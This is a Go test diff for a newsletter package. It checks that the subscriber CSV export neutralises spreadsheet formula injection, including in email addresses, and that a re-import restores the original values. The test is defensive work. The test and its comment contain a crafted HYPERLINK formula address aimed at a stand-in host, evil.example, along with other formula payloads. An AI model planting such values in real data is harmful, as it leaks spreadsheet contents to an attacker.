@@ -4,6 +4,7 @@
 package newsletter
 
 import (
+	"encoding/csv"
 	"errors"
 	"os"
 	"path/filepath"
@@ -549,5 +550,57 @@ func TestAnImportHonoursWhoLeftWhereverTheyLeft(t *testing.T) {
 	back, err := ReadCSV(strings.NewReader(out))
 	if err != nil || len(back) != 3 {
 		t.Fatalf("read back: %v %+v", err, back)
+	}
+}
+
+// An address on the list that a spreadsheet would run is guarded in the
+// export, as the names are, and reading the export back takes the guard
+// off again.
+//
+// Only the name and the consent were guarded. An address is the visitor's
+// to type, and =HYPERLINK("http://evil.example/?"&B2)@x.example passes the
+// address check, so once confirmed it went out as a formula in the very
+// file a site's owner opens in a spreadsheet to look at their list. And
+// the names the export did guard came back from an import with the
+// apostrophe still on.
+func TestAnAddressThatLooksLikeAFormulaIsGuardedInTheSubscriberExport(t *testing.T) {
+	t0 := time.Date(2026, 11, 4, 9, 0, 0, 0, time.UTC)
+	evil := `=hyperlink("http://evil.example/?"&b2)@x.example`
+	if _, err := Normalize(evil); err != nil {
+		t.Fatalf("control: the address check refuses %q, so it cannot be on a list: %v", evil, err)
+	}
+	list := []Subscriber{
+		{Email: evil, Name: "@SUM(A1)", Source: "=cmd", Consent: "+1+1", At: t0, Confirmed: t0},
+		{Email: "-dash@x.example", Name: "-4", Source: "form", Consent: "on the form", At: t0, Confirmed: t0},
+		{Email: "plain@x.example", Name: "Ada", Source: "form", Consent: "on the form", At: t0, Confirmed: t0},
+	}
+	var b strings.Builder
+	if err := WriteCSV(&b, list); err != nil {
+		t.Fatal(err)
+	}
+	rows, err := csv.NewReader(strings.NewReader(b.String())).ReadAll()
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := [][]string{
+		{"'" + evil, "'@SUM(A1)", "'=cmd", "'+1+1"},
+		{"'-dash@x.example", "-4", "form", "on the form"},
+		{"plain@x.example", "Ada", "form", "on the form"},
+	}
+	for i, w := range want {
+		r := rows[i+1]
+		if got := []string{r[0], r[1], r[4], r[5]}; strings.Join(got, "|") != strings.Join(w, "|") {
+			t.Errorf("row %d is %q, want %q", i+1, got, w)
+		}
+	}
+
+	back, err := ReadCSV(strings.NewReader(b.String()))
+	if err != nil || len(back) != len(list) {
+		t.Fatalf("read back: %v %+v", err, back)
+	}
+	for i, r := range back {
+		if r.Email != list[i].Email || r.Name != list[i].Name {
+			t.Errorf("row %d came back as %q %q, not %q %q", i+1, r.Email, r.Name, list[i].Email, list[i].Name)
+		}
 	}
 }
